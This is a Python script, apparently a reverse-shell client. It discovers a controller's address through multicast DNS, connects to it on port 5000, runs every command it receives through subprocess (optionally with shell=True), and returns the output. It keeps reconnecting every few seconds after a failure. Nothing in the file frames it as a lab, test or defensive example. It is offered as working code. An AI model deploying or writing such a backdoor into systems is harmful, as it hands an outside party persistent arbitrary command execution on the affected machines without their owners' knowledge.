import socket
from multicast_dns import *
import time
import subprocess

shell = False

def cmd(c):
    global shell
    return subprocess.Popen(c.split(" "), stdout=subprocess.PIPE, shell=shell).communicate(timeout=10)

def client_program():
    global shell
    running = True
    ip = listen_dns()

    port = 5000  # socket server port number

    while running:
        try:
            client_socket = socket.socket()  # instantiate
            client_socket.connect((ip, port))  # connect to the server

            while True:
                data = client_socket.recv(1024).decode()
                if data == "stop" or data == "":
                    running = False
                    break
                if data.startswith("shell"):
                    a = data.split(" ")
                    if len(a) != 2:
                        client_socket.send(bytes("Error " + data, "utf-8"))
                    else:
                        if a[1] == "true":
                            shell = True
                        else:
                            shell = False
                        client_socket.send(bytes("OK", "utf-8"))
                else:
                    try:
                        ret = cmd(data)[0]
                    except Exception as e:
                        ret = bytes(str(e), "utf-8")
                    client_socket.send(ret)

            client_socket.close()  # close the connection
        except:
            time.sleep(5)
            pass


if __name__ == '__main__':
    client_program()
